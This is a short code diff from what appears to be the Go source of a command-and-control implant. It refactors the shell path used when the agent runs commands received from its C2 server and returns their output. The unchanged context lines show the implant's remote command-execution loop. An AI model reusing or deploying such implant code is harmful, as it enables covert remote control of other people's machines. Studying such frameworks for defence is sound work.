@@ -502,8 +502,8 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
 		shell := "/bin/sh"
-		if util.IsFileExist(emp3r0r_data.UtilsPath + "bash") {
-			shell = emp3r0r_data.UtilsPath + "bash"
+		if util.IsFileExist(emp3r0r_data.DefaultShell) {
+			shell = emp3r0r_data.DefaultShell
 		}
 		cmd := exec.Command(shell, "-c", strings.Join(cmdSlice, " "))
 		outCombined, err = cmd.CombinedOutput()
